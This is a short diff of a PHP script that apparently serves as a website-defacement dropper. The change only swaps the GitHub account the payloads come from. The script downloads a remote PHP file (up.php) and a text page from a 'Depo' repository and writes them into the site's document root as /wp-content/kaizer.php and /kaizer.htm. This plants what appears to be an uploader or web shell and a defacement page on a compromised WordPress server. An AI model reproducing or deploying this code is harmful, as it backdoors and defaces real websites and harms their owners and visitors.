@@ -10,7 +10,7 @@ function http_get($url){
 	curl_close($im);
 }
 $check = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/kaizer.php" ;
-$text = http_get('https://raw.githubusercontent.com/kaizerdefacerxx/Depo/master/up.php');
+$text = http_get('https://raw.githubusercontent.com/Kaiturk/Depo/master/up.php');
 $open = fopen($check, 'w');
 fwrite($open, $text);
 fclose($open);
@@ -21,7 +21,7 @@ if(file_exists($check)){
 echo "done .\n " ;
 
 $check2 = $_SERVER['DOCUMENT_ROOT'] . "/kaizer.htm" ;
-$text2 = http_get('https://raw.githubusercontent.com/kaizerdefacerxx/Depo/master/kaizer.txt');
+$text2 = http_get('https://raw.githubusercontent.com/Kaiturk/Depo/master/kaizer.txt');
 $open2 = fopen($check2, 'w');
 fwrite($open2, $text2);
 fclose($open2);
